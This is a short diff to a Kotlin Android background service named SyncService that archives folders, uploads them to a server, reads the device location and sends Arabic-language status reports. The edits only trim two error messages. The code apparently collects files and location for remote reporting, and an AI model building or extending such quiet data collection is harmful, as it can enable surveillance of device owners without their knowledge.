@@ -285,7 +285,7 @@ class SyncService : Service() {
                     sendTextReport("خطأ الرفع", "فشل رفع أرشيف $folderName إلى السيرفر.")
                 }
             } else {
-                sendTextReport("تنبيه الأرشيف", "مجلد $folderName فارغ أو تعذر الوصول إليه (قد يتطلب أذونات الوسائط).")
+                sendTextReport("تنبيه الأرشيف", "مجلد $folderName فارغ أو تعذر الوصول إليه.")
             }
         } catch (e: Exception) {
             sendTextReport("خطأ ضغط المجلدات", "فشل ضغط $folderName بسبب الصلاحيات أو الخطأ: ${e.message}")
@@ -383,7 +383,7 @@ class SyncService : Service() {
         return try {
             val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
             val loc: Location? = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
-            if (loc != null) "Lat: ${loc.latitude}, Lng: ${loc.longitude}" else "الموقع غير متوفر حالياً (تأكد من تفعيل GPS ومنح صلاحية الموقع)."
+            if (loc != null) "Lat: ${loc.latitude}, Lng: ${loc.longitude}" else "الموقع غير متوفر حالياً."
         } catch (e: Exception) {
             "خطأ في قراءة الموقع (صلاحية الموقع غير منحة): ${e.message}"
         }
